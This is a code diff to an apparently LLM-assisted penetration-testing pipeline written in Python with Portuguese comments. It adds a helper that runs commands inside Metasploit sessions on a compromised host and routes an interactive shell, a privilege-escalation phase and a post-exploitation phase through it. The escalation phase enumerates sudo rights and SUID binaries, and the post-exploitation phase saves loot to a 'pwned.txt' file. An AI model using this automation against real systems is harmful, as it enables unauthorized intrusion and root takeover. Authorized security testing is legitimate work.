@@ -257,15 +257,23 @@ class PentestPipeline(PipelineBase):
         except Exception:
             pass
 
+    def session_exec(self, cmd, timeout=20):
+        """Executa UM comando na sessao MSF pelo console:
+        'sessions -c <cmd> -i <sid>'. Caminho unico e confiavel para shell e
+        meterpreter (substitui shell_write/shell_read, que eram instaveis).
+        Faz quoting POSIX seguro do comando (aspas simples + escape de ')."""
+        if not self.session_id:
+            return ""
+        safe = "'" + str(cmd).replace("'", "'\\''") + "'"
+        line = "sessions -c %s -i %s" % (safe, self.session_id)
+        try:
+            return self.msf.execute_command(line, timeout=timeout) or ""
+        except Exception as e:
+            return "[erro session_exec: %s]" % e
+
     def enter_interactive_mode(self):
         if not self.session_id: return
         print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
-        try:
-            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
-            time.sleep(1)
-            self.msf.client.call('session.shell_read', [self.session_id])
-        except: pass
-
         while True:
             try:
                 cmd = input(f"{C_BOLD}{C_BLUE}Shell@{self.target_ip} > {C_RESET}")
@@ -273,10 +281,8 @@ class PentestPipeline(PipelineBase):
                     print(f"{C_YELLOW}[*] Encerrando interacao.{C_RESET}")
                     break
                 if not cmd.strip(): continue
-                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
-                time.sleep(1.5)
-                res = self.msf.client.call('session.shell_read', [self.session_id])
-                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
+                out = self.session_exec(cmd)
+                if out: print(f"{C_GREEN}{out.strip()}{C_RESET}")
             except: break
 
     def _is_web(self, port, banner):
@@ -1152,13 +1158,7 @@ If the output above already proves execution on the target, set done=true.
         print(f"\n>>> [FASE 5] ESCALONAMENTO DE PRIVILEGIO (uid != 0)")
 
         def sh(cmd, wait=4):
-            try:
-                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
-                time.sleep(wait)
-                res = self.msf.client.call('session.shell_read', [self.session_id])
-                return (res or {}).get('data', '') or ''
-            except Exception as e:
-                return f"[erro shell: {e}]"
+            return self.session_exec(cmd, timeout=max(30, wait * 5))
 
         enum = sh("id; uname -a; sudo -n -l 2>/dev/null; "
                   "find / -perm -4000 -type f 2>/dev/null | head -40; "
@@ -1229,14 +1229,12 @@ If the history already shows uid=0(root), set done=true.
     def phase_4_post_exploitation(self):
         print(f"\n>>> [FASE 4] POST-EXPLORACAO")
         try:
-            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
-            time.sleep(3)
-            res = self.msf.client.call('session.shell_read', [self.session_id])
-            print(f"{C_GREEN}{res['data']}{C_RESET}")
-            self.evidence["shell_info"] = str(res['data'])
-            
+            data = self.session_exec("id; hostname")
+            print(f"{C_GREEN}{data}{C_RESET}")
+            self.evidence["shell_info"] = str(data)
+
             with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
-                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
+                f.write(f"ALVO: {self.target_ip}\nSESSAO: {self.session_id}\nDADOS: {data}")
         except: pass
 
 def get_best_route_ip(target_ip):
